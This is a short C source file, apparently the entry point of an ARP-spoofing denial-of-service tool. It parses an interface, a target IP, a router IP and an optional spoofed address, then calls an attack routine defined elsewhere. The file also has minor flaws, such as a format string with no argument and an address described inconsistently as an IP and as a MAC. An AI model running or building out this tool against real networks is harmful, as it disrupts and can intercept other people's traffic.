#include "arp.h"

int main(const int argc, const char *argv[])
{
    int ret = -1;
    int macspoof = 1;

    if(argc < 4) {
        err("Usage: %s <INTERFACE> <TARGET_IP> <ROUTER_IP> opt:<IP_TO_SPOOF_FROM>");
        goto out;
    }

    if(argc == 4)
        macspoof = 0;

    const char *interface = argv[1];
    const char *target_ip = argv[2];
    const char *router_ip = argv[3];
    const char *spoof_ip;

    if(macspoof == 1) {
        if(!argv[4][0]) {
            err("Please enter MAC address");
            goto out;
        }

        spoof_ip = argv[4];
    }
    else {
        debug("Not spoofing mac address");
        spoof_ip = NULL;
    }

    if(run_local_dos_attack(interface, target_ip, router_ip, spoof_ip, macspoof) != 0) {
        err("DOS FAILED");
        goto out;
    }

    ret = 0;

out:
    return ret;
}
